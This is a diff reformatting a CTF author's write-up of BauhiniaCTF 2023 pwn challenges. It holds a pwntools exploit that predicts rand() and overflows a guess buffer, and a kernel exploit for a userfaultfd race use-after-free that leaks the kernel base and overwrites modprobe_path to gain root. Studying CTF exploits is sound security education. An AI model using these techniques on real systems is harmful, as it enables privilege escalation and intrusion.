@@ -1,256 +1,229 @@
 <!DOCTYPE html>
-<html class="" lang="en-us"><head>
-    
-    <meta name="viewport" content="width=device-width" />
-    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+<html class="" lang="en-us">
 
-    <link
-    rel="icon"
-    href='/favicon.png'
-/>
-<link
-    rel="shortcut icon"
-    href='/favicon.ico'
-    type="image/x-icon"
-/>
-<link
-    rel="apple-touch-icon"
-    href='/apple-touch-icon.png'
-/>
+<head>
 
-    <link
-        rel="icon"
-        href='/logo.svg'
-        type="image/svg+xml"
-    />
+  <meta name="viewport" content="width=device-width" />
+  <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=7" />
 
-<title>
-        
-            BauhiniaCTF 2023 Author Writeups  &ndash;
-        
-        Blogs
-    </title>
-    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
-    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
-    
-    
-    <link type="text/css" rel="stylesheet" href="../../css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css" integrity="sha512-b4RRStYyYA&#43;6MVJSo4418wIY89XsJowSNvYnghdpFwAucEwrFCotlJvYMcb&#43;q8PW2zWjxtbhUbg5uf6AzBn6Tw==" />
-<meta name="author" content="botton" />
+  <link rel="icon" href='/favicon.png' />
+  <link rel="shortcut icon" href='/favicon.ico' type="image/x-icon" />
+  <link rel="apple-touch-icon" href='/apple-touch-icon.png' />
 
-    
-        <meta name="keywords" content='ctf' />
-    
-    
-        <meta name="description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
-    
+  <link rel="icon" href='/logo.svg' type="image/svg+xml" />
 
-<meta property="og:site_name"
-    content='Blogs' />
+  <title>
 
-    <meta property="og:title" content="BauhiniaCTF 2023 Author Writeups" />
-    <meta property="og:type" content="article" />
-    
-    <meta
-        property="article:author" content="botton" />
-    <meta
-        property="article:published_time"
-        content='2023-08-20T17:37:11Z&#43;0800' />
-    
-        
-            <meta property="article:tag" content="ctf" />
-        
-    
-    <meta property="og:url" content="https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/" />
-    <meta property="og:image"
-        content='https://bott0n.github.io/icon512.png
+    BauhiniaCTF 2023 Author Writeups &ndash;
+
+    Blogs
+  </title>
+  <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+  <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+
+
+  <link type="text/css" rel="stylesheet"
+    href="../../css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css"
+    integrity="sha512-b4RRStYyYA&#43;6MVJSo4418wIY89XsJowSNvYnghdpFwAucEwrFCotlJvYMcb&#43;q8PW2zWjxtbhUbg5uf6AzBn6Tw==" />
+  <meta name="author" content="botton" />
+
+
+  <meta name="keywords" content='ctf' />
+
+
+  <meta name="description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
+
+
+  <meta property="og:site_name" content='Blogs' />
+
+  <meta property="og:title" content="BauhiniaCTF 2023 Author Writeups" />
+  <meta property="og:type" content="article" />
+
+  <meta property="article:author" content="botton" />
+  <meta property="article:published_time" content='2023-08-20T17:37:11Z&#43;0800' />
+
+
+  <meta property="article:tag" content="ctf" />
+
+
+  <meta property="og:url" content="https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/" />
+  <meta property="og:image" content='https://bott0n.github.io/icon512.png
     ' />
-    
-        <meta property="og:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
-    
 
-<meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:domain"
-      content='bott0n.github.io'
-/>
-<meta property="twitter:url" content="https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/" />
+  <meta property="og:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
 
 
-    <meta name="twitter:title" content="BauhiniaCTF 2023 Author Writeups" />
-    
-    <meta name="twitter:image"
-        content='https://bott0n.github.io/icon512.png
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta property="twitter:domain" content='bott0n.github.io' />
+  <meta property="twitter:url" content="https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/" />
+
+
+  <meta name="twitter:title" content="BauhiniaCTF 2023 Author Writeups" />
+
+  <meta name="twitter:image" content='https://bott0n.github.io/icon512.png
     ' />
-    
-        <meta name="twitter:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
-    
 
-<link rel="manifest" href="/manifest/index.json" />
+  <meta name="twitter:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
+
+
+  <link rel="manifest" href="/manifest/index.json" />
 </head>
 
 
 <body>
-        <div id="baseContainer"><header class="">
-<div class="titleAndSearchContainer">
+  <div id="baseContainer">
+    <header class="">
+      <div class="titleAndSearchContainer">
         <div id="titleContainer">
-            
-                <a class="unstyledLink" href="/">
-                    <img src='/logo.svg' />
-                </a>
-            
-            <div class="rightOfLogo">
-                <div class="titleAndHamburger">
-                    <h1>
-                        <a class="unstyledLink" href="/">Blogs</a>
-                        
-                    </h1>
-                    
-                </div>
-                <div id="wide_nav"><nav>
-    
-    <ul id="main-nav">
-        <li><a href="/">Home</a></li>
-        
-            <li><a href="/posts">Posts</a></li>
-        
-        
-        
-        
-        
-        
-            <li><a href="https://bott0n.github.io/about/aboutme/">About</a></li>
-        
-        
-            <li><a href="/tags">Tags</a></li>
-        
-        
-    </ul>
-</nav>
-</div>
+
+          <a class="unstyledLink" href="/">
+            <img src='/logo.svg' />
+          </a>
+
+          <div class="rightOfLogo">
+            <div class="titleAndHamburger">
+              <h1>
+                <a class="unstyledLink" href="/">Blogs</a>
+
+              </h1>
+
             </div>
+            <div id="wide_nav">
+              <nav>
+
+                <ul id="main-nav">
+                  <li><a href="/">Home</a></li>
+
+                  <li><a href="/posts">Posts</a></li>
+
+
+
+
+
+
+                  <li><a href="https://bott0n.github.io/about/aboutme/">About</a></li>
+
+
+                  <li><a href="/tags">Tags</a></li>
+
+
+                </ul>
+              </nav>
+            </div>
+          </div>
         </div>
         <div class="search">
-    <input id="searchbar" type="text" placeholder='Search' />
-    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
-</div>
-<script>
-    function newSearch() {
-        let term = searchbar.value.trim();
-        if (!term) return;
-        location.href = `/search?q=${term}`;
-    }
-    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
-</script>
+          <input id="searchbar" type="text" placeholder='Search' />
+          <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+        </div>
+        <script>
+          function newSearch() {
+            let term = searchbar.value.trim();
+            if (!term) return;
+            location.href = `/search?q=${term}`;
+          }
+          searchbar.onkeyup = (ev) => { if (ev.keyCode == 13) newSearch() };
+        </script>
 
-    </div>
-    <div id="links">
-        <a
-    
-        rel="noreferrer"
-    
-    target="_blank"
-    class="nerdlink"
-    href="/index.xml">
-    
-    
-        &#xf09e;
-    
-    <span>
-        RSS
-    </span>
-</a>
+      </div>
+      <div id="links">
+        <a rel="noreferrer" target="_blank" class="nerdlink" href="/index.xml">
 
-        
-        <a
-    
-        rel="noreferrer"
-    
-    target="_blank"
-    class="nerdlink"
-    href="https://github.com/bott0n">
-    
-    
-        &#xf09b;
-    
-    <span>
-        GitHab
-    </span>
-</a>
-<a
-    
-        rel="noreferrer"
-    
-    target="_blank"
-    class="nerdlink"
-    href="https://twitter.com/botton3310">
-    
-    
-        &#xf099;
-    
-    <span>
-        Titter
-    </span>
-</a>
 
-    </div>
-    
+          &#xf09e;
 
-</header>
-<div id="contentContainer">
-                <div id="content">
-                    <main>
-<article class="card single">
-    
-        <h1>BauhiniaCTF 2023 Author Writeups</h1>
-    
-    
-        <p class="date">
-            <span title='Date'> </span>
-    2023-08-20
+          <span>
+            RSS
+          </span>
+        </a>
 
-</p>
-    
-    
-    
-    <div class="articleToc">
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#introduction">Introduction</a></li>
-    <li><a href="#god-of-gamblers-50-points--45-solves">God of Gamblers (50 points / 45 solves)</a>
-      <ul>
-        <li><a href="#vulnerability-1">Vulnerability 1</a></li>
-        <li><a href="#vulnerability-2">Vulnerability 2</a></li>
-        <li><a href="#exploit-script">Exploit script</a></li>
-      </ul>
-    </li>
-    <li><a href="#kernpass-430-points--10-solves">Kernpass (430 points / 10 solves)</a>
-      <ul>
-        <li><a href="#vulnerability">Vulnerability</a></li>
-        <li><a href="#uaf---leak-kernel-address">UAF - Leak kernel address</a></li>
-        <li><a href="#uaf---arbitrary-address-write-primitive-aaw">UAF - Arbitrary Address Write Primitive (AAW)</a></li>
-        <li><a href="#exploit-script-1">Exploit Script</a></li>
-      </ul>
-    </li>
-    <li><a href="#disconnect-500-points--1-solve">Disconnect (500 points / 1 solve)</a>
-      <ul>
-        <li><a href="#intended-solution">Intended Solution</a></li>
-        <li><a href="#exploit-script-2">Exploit Script</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-    <hr />
-</div>
 
-    <div><h1 id="introduction">Introduction</h1>
-<p>In Bauhinia CTF 2023, I have created 3 pwn challenge: <code>God of Gamblers</code>, <code>Kernpass</code>, and <code>Disconnect</code>.</p>
-<p>In this post, I will show you the author writeups and the intended solution of those challenges.</p>
-<p>Hope You enjoyed the challenges.</p>
-<h1 id="god-of-gamblers-50-points--45-solves">God of Gamblers (50 points / 45 solves)</h1>
-<p><img src="https://i.imgur.com/S3VTwBJ.png" alt="Imgur"></p>
-<p>This challenge is aimed for beginner-friendly which doesn&rsquo;t require much exploit skill and technique. The challenging point is to understand that it is easy to predict the random value gerenarted by <code>srand(time(0))</code> and  <code>rand()</code>, and a little bit buffer overflow.
-In this challenge, only the stripped binary provided. Here is the source code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+        <a rel="noreferrer" target="_blank" class="nerdlink" href="https://github.com/bott0n">
+
+
+          &#xf09b;
+
+          <span>
+            GitHab
+          </span>
+        </a>
+        <a rel="noreferrer" target="_blank" class="nerdlink" href="https://twitter.com/botton3310">
+
+
+          &#xf099;
+
+          <span>
+            Titter
+          </span>
+        </a>
+
+      </div>
+
+
+    </header>
+    <div id="contentContainer">
+      <div id="content">
+        <main>
+          <article class="card single">
+
+            <h1>BauhiniaCTF 2023 Author Writeups</h1>
+
+
+            <p class="date">
+              <span title='Date'> </span>
+              2023-08-20
+
+            </p>
+
+
+
+            <div class="articleToc">
+              <nav id="TableOfContents">
+                <ul>
+                  <li><a href="#introduction">Introduction</a></li>
+                  <li><a href="#god-of-gamblers-50-points--45-solves">God of Gamblers (50 points / 45 solves)</a>
+                    <ul>
+                      <li><a href="#vulnerability-1">Vulnerability 1</a></li>
+                      <li><a href="#vulnerability-2">Vulnerability 2</a></li>
+                      <li><a href="#exploit-script">Exploit script</a></li>
+                    </ul>
+                  </li>
+                  <li><a href="#kernpass-430-points--10-solves">Kernpass (430 points / 10 solves)</a>
+                    <ul>
+                      <li><a href="#vulnerability">Vulnerability</a></li>
+                      <li><a href="#uaf---leak-kernel-address">UAF - Leak kernel address</a></li>
+                      <li><a href="#uaf---arbitrary-address-write-primitive-aaw">UAF - Arbitrary Address Write Primitive
+                          (AAW)</a></li>
+                      <li><a href="#exploit-script-1">Exploit Script</a></li>
+                    </ul>
+                  </li>
+                  <li><a href="#disconnect-500-points--1-solve">Disconnect (500 points / 1 solve)</a>
+                    <ul>
+                      <li><a href="#intended-solution">Intended Solution</a></li>
+                      <li><a href="#exploit-script-2">Exploit Script</a></li>
+                    </ul>
+                  </li>
+                </ul>
+              </nav>
+              <hr />
+            </div>
+
+            <div>
+              <h1 id="introduction">Introduction</h1>
+              <p>In Bauhinia CTF 2023, I have created 3 pwn challenge: <code>God of Gamblers</code>,
+                <code>Kernpass</code>, and <code>Disconnect</code>.</p>
+              <p>In this post, I will show you the author writeups and the intended solution of those challenges.</p>
+              <p>Hope You enjoyed the challenges.</p>
+              <h1 id="god-of-gamblers-50-points--45-solves">God of Gamblers (50 points / 45 solves)</h1>
+              <p><img src="https://i.imgur.com/S3VTwBJ.png" alt="Imgur"></p>
+              <p>This challenge is aimed for beginner-friendly which doesn&rsquo;t require much exploit skill and
+                technique. The challenging point is to understand that it is easy to predict the random value gerenarted
+                by <code>srand(time(0))</code> and <code>rand()</code>, and a little bit buffer overflow.
+                In this challenge, only the stripped binary provided. Here is the source code:</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
@@ -375,28 +348,45 @@ In this challenge, only the stripped binary provided. Here is the source code:</
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
 
-</code></pre></div><p>There are two vulnerability in the program.</p>
-<h2 id="vulnerability-1">Vulnerability 1</h2>
-<p>Run the progam, we will seee the goal is to win $25000000 from $20.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Welcome to the dice game!
+</code></pre>
+              </div>
+              <p>There are two vulnerability in the program.</p>
+              <h2 id="vulnerability-1">Vulnerability 1</h2>
+              <p>Run the progam, we will seee the goal is to win $25000000 from $20.</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Welcome to the dice game!
 You have $20 to start with. The goal is to reach $25000000.
 Enter your bet <span style="color:#f92672">(</span>or enter <span style="color:#ae81ff">0</span> to quit<span style="color:#f92672">)</span>: 
-</code></pre></div><p>To play the game, we need to enter our bet and choose <code>small</code> or <code>big</code></p>
-<pre tabindex="0"><code>Enter your bet (or enter 0 to quit): 20
+</code></pre>
+              </div>
+              <p>To play the game, we need to enter our bet and choose <code>small</code> or <code>big</code></p>
+              <pre tabindex="0"><code>Enter your bet (or enter 0 to quit): 20
 Enter 1 for small or 2 for big: 2
 Sorry, you lose $20.
 The result is 6 (dice 1: 1, dice 2: 4, dice 3: 1).
 Your balance is now $0.
-</code></pre><p>The result is combined by 3 dices. 3-9 is small and 10-18 is big.
-From the source code, we can found all the dices are gerneated from <code>rand()</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">dice1 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// generate a random number between 1 and 6 for each die
+</code></pre>
+              <p>The result is combined by 3 dices. 3-9 is small and 10-18 is big.
+                From the source code, we can found all the dices are gerneated from <code>rand()</code></p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">dice1 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// generate a random number between 1 and 6 for each die
 </span><span style="color:#75715e"></span>dice2 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
 dice3 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
 points <span style="color:#f92672">=</span> dice1 <span style="color:#f92672">+</span> dice2 <span style="color:#f92672">+</span> dice3; <span style="color:#75715e">// add up the points from the three dice
-</span></code></pre></div><p>Also, we knew the seed is based on time(0);</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">srand(time(NULL));
-</code></pre></div><p>In view of that, we can use the same seed to predict the <code>rand()</code> result.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Load the C standard library</span>
+</span></code></pre>
+              </div>
+              <p>Also, we knew the seed is based on time(0);</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">srand(time(NULL));
+</code></pre>
+              </div>
+              <p>In view of that, we can use the same seed to predict the <code>rand()</code> result.</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Load the C standard library</span>
 libc <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
 
 <span style="color:#75715e"># Define the argument and return types for srand</span>
@@ -426,10 +416,14 @@ balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</spa
     sla(<span style="color:#e6db74">&#34;Enter your bet (or enter 0 to quit): &#34;</span>, str(balance))
     sla(<span style="color:#e6db74">&#34;Enter 1 for small or 2 for big: &#34;</span>, str(guess(libc)))
     balance <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
-</code></pre></div><h2 id="vulnerability-2">Vulnerability 2</h2>
-<p>With the above prediction, We are entered to the final stage.</p>
-<p>This time, the challenge seems require us to guess the value from <code>/dev/urandom</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  <span style="color:#75715e">// Open /dev/urandom for reading
+</code></pre>
+              </div>
+              <h2 id="vulnerability-2">Vulnerability 2</h2>
+              <p>With the above prediction, We are entered to the final stage.</p>
+              <p>This time, the challenge seems require us to guess the value from <code>/dev/urandom</code>.</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  <span style="color:#75715e">// Open /dev/urandom for reading
 </span><span style="color:#75715e"></span>    fp <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
     <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> NULL) {
         printf(<span style="color:#e6db74">&#34;Error opening /dev/urandom.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
@@ -441,10 +435,16 @@ balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</spa
 
     <span style="color:#75715e">// Close /dev/urandom
 </span><span style="color:#75715e"></span>    fclose(fp);
-</code></pre></div><p>It seems a impossible task for me (maybe it just a piece of cake for crypto player)</p>
-<p>However, when we look closer, it use <code>scanf(&quot;%s&quot;, &amp;guess);</code> to receive the guess and the random_number and the guess are next to each other. So, it is clear to know that, we can input 16 same bytes to pass it.</p>
-<h2 id="exploit-script">Exploit script</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</code></pre>
+              </div>
+              <p>It seems a impossible task for me (maybe it just a piece of cake for crypto player)</p>
+              <p>However, when we look closer, it use <code>scanf(&quot;%s&quot;, &amp;guess);</code> to receive the
+                guess and the random_number and the guess are next to each other. So, it is clear to know that, we can
+                input 16 same bytes to pass it.</p>
+              <h2 id="exploit-script">Exploit script</h2>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> ctypes
 
 TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
@@ -514,13 +514,25 @@ balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</spa
 sl(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
 p<span style="color:#f92672">.</span>interactive()
 
-</code></pre></div><h1 id="kernpass-430-points--10-solves">Kernpass (430 points / 10 solves)</h1>
-<p><img src="https://i.imgur.com/VxCl23a.png" alt="Imgur"></p>
-<p>Kernpass is a kernel pwn challenge. This is the first time I make a kernel pwn challegne, so it actually cost me so much time on compiling kernel, busybox and kernel module debugging. To be honest, this is the very time for me to create a kernel pwnchallenge, amount of terrible permission misconfiguration leads to several unintended solution. I apologize for that.</p>
-<p>This challnege is a very classic &ldquo;note-liked&rdquo; heap challenge, it might be easy for the kernel pwn player. You may find that the challenge called &ldquo;kernpass&rdquo; but there are not any encryption or endcoding elements inside. In fact, in the very early stages of the idea, I did want to implement a complex encryption system on it. However, I found it difficult to solve on my own :( and the hard deadline is coming soon. So I keep it simple.</p>
-<p>I think it is a light work for kernel pwn player to reverse it, so I decided to provide the kernel module only.</p>
-<p>Here is the source code of the kernel module:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/cdev.h&gt;</span><span style="color:#75715e">
+</code></pre>
+              </div>
+              <h1 id="kernpass-430-points--10-solves">Kernpass (430 points / 10 solves)</h1>
+              <p><img src="https://i.imgur.com/VxCl23a.png" alt="Imgur"></p>
+              <p>Kernpass is a kernel pwn challenge. This is the first time I make a kernel pwn challegne, so it
+                actually cost me so much time on compiling kernel, busybox and kernel module debugging. To be honest,
+                this is the very time for me to create a kernel pwnchallenge, amount of terrible permission
+                misconfiguration leads to several unintended solution. I apologize for that.</p>
+              <p>This challnege is a very classic &ldquo;note-liked&rdquo; heap challenge, it might be easy for the
+                kernel pwn player. You may find that the challenge called &ldquo;kernpass&rdquo; but there are not any
+                encryption or endcoding elements inside. In fact, in the very early stages of the idea, I did want to
+                implement a complex encryption system on it. However, I found it difficult to solve on my own :( and the
+                hard deadline is coming soon. So I keep it simple.</p>
+              <p>I think it is a light work for kernel pwn player to reverse it, so I decided to provide the kernel
+                module only.</p>
+              <p>Here is the source code of the kernel module:</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/cdev.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
@@ -721,46 +733,61 @@ password_list<span style="color:#f92672">*</span> main_list;
 module_init(module_initialize);
 module_exit(module_cleanup);
 
-</code></pre></div><h2 id="vulnerability">Vulnerability</h2>
-<p>The intended vulnerability of the challenge is race condition to cause UAF.
-We can see it has not implemented mutex in the source code and it enabled userfaultfd for normal user from <code>/init</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#ae81ff">1</span> &gt; /proc/sys/vm/unprivileged_userfaultfd
-</code></pre></div><h2 id="uaf---leak-kernel-address">UAF - Leak kernel address</h2>
-<p>We can follow the following steps to leak kernel address</p>
-<p>Thread 1:</p>
-<ol>
-<li>Create a 0x20 size password, password #0</li>
-<li>register a uffd page</li>
-<li>Check password #0 using the uffd page to trigger page fault</li>
-</ol>
-<p>Thread 2 start:</p>
-<ol start="4">
-<li>Delete password #0</li>
-<li>Spray <code>seq_operations</code> <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations">kmalloc-32 heap spray</a></li>
-</ol>
-<p>Thread 2 end, thread 1 continue</p>
-<p>It return the data of <code>seq_operations</code> struture which reveal the kernel address. We can calculate the kernel base address by finding the offset manuelly.</p>
-<h2 id="uaf---arbitrary-address-write-primitive-aaw">UAF - Arbitrary Address Write Primitive (AAW)</h2>
-<p>As the structure size of password_entity 0x10, we are able to retrieve AAW through heap chunk overlapping.</p>
-<p>Thread 1:</p>
-<ol>
-<li>Create a 0x10 size password, password #0</li>
-<li>register a uffd page</li>
-<li>Edit password #0 using the uffd page to trigger page fault and prepare the address to write data in</li>
-</ol>
-<p>Thread 2 start:</p>
-<ol start="4">
-<li>Delete password #0</li>
-<li>Create two 0x20 size password, password #2 &amp; #3</li>
-</ol>
-<p>Thread 2 end, thread 1 continue</p>
-<ol start="6">
-<li>The pointer in password #3 will be overwritten with the address that we prepared in step3</li>
-</ol>
-<p>The easiest way to become root with knowing kernel base address and having AAW is to modify modprobe_path.</p>
-<p>Therefore, we put our path to modprobe_path address by AAW to exploit it and get the flag.</p>
-<h2 id="exploit-script-1">Exploit Script</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define _GNU_SOURCE
+</code></pre>
+              </div>
+              <h2 id="vulnerability">Vulnerability</h2>
+              <p>The intended vulnerability of the challenge is race condition to cause UAF.
+                We can see it has not implemented mutex in the source code and it enabled userfaultfd for normal user
+                from <code>/init</code>.</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#ae81ff">1</span> &gt; /proc/sys/vm/unprivileged_userfaultfd
+</code></pre>
+              </div>
+              <h2 id="uaf---leak-kernel-address">UAF - Leak kernel address</h2>
+              <p>We can follow the following steps to leak kernel address</p>
+              <p>Thread 1:</p>
+              <ol>
+                <li>Create a 0x20 size password, password #0</li>
+                <li>register a uffd page</li>
+                <li>Check password #0 using the uffd page to trigger page fault</li>
+              </ol>
+              <p>Thread 2 start:</p>
+              <ol start="4">
+                <li>Delete password #0</li>
+                <li>Spray <code>seq_operations</code> <a
+                    href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations">kmalloc-32 heap
+                    spray</a></li>
+              </ol>
+              <p>Thread 2 end, thread 1 continue</p>
+              <p>It return the data of <code>seq_operations</code> struture which reveal the kernel address. We can
+                calculate the kernel base address by finding the offset manuelly.</p>
+              <h2 id="uaf---arbitrary-address-write-primitive-aaw">UAF - Arbitrary Address Write Primitive (AAW)</h2>
+              <p>As the structure size of password_entity 0x10, we are able to retrieve AAW through heap chunk
+                overlapping.</p>
+              <p>Thread 1:</p>
+              <ol>
+                <li>Create a 0x10 size password, password #0</li>
+                <li>register a uffd page</li>
+                <li>Edit password #0 using the uffd page to trigger page fault and prepare the address to write data in
+                </li>
+              </ol>
+              <p>Thread 2 start:</p>
+              <ol start="4">
+                <li>Delete password #0</li>
+                <li>Create two 0x20 size password, password #2 &amp; #3</li>
+              </ol>
+              <p>Thread 2 end, thread 1 continue</p>
+              <ol start="6">
+                <li>The pointer in password #3 will be overwritten with the address that we prepared in step3</li>
+              </ol>
+              <p>The easiest way to become root with knowing kernel base address and having AAW is to modify
+                modprobe_path.</p>
+              <p>Therefore, we put our path to modprobe_path address by AAW to exploit it and get the flag.</p>
+              <h2 id="exploit-script-1">Exploit Script</h2>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define _GNU_SOURCE
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/userfaultfd.h&gt;</span><span style="color:#75715e">
@@ -1031,34 +1058,59 @@ cpu_set_t pwn_cpu;
     
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
-</code></pre></div><h1 id="disconnect-500-points--1-solve">Disconnect (500 points / 1 solve)</h1>
